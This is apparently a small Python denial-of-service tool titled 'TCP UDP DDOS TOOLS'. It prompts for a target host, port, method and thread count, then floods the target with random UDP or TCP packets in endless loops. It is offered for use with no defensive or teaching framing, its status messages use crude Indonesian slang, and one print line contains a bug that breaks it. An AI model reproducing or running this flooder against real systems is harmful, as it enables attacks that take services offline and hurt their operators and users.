#bylampp
import random 
import socket
import threading
import os , sys

print ('''
██████╗░██████╗░░█████╗░░██████╗████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░''')
print("              =======TCP UDP DDOS TOOLS=======                             ")
print("             =======Create Date :2-12-22=======                             ")
print("              =======H4N5 TOOLS BASIC=======                          ")
ip = str(input(" Host :"))
port = int(input(" Port :"))
choice = str(input(" Method :"))
times = int(input(" Times :"))
threads = int(input(" Threads :"))
os.system("clear")
def udp():
	data = random._urandom(900)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[91m  Mengentod %s \\033[91m Dan memberi peju %s"%(ip,port))
		except:
			print("\033[91m Server %s MT %s"%(ip,port))
def tcp():
	data = random._urandom(3016)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			s.close()
			print("\033[91m Mengentod %s Dan memberi udud %s"%(ip,port))

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()